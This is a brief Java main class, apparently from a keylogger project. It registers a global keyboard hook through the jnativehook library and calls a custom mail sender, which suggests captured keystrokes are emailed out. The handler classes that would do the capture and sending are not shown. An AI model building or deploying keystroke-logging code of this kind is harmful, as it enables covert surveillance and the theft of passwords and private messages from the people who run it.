package Main;

import com.github.kwhat.jnativehook.*;

import handlers.ManageService;
import handlers.Sender;
public class Main {

	public static void main(String[] args) {
        ManageService service= new ManageService();
		
		try {
			Sender.MailSender("What is Up");
			GlobalScreen.registerNativeHook();
		}
		catch (Throwable e)
		{
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(service.getKeyboard());
		

	}

}
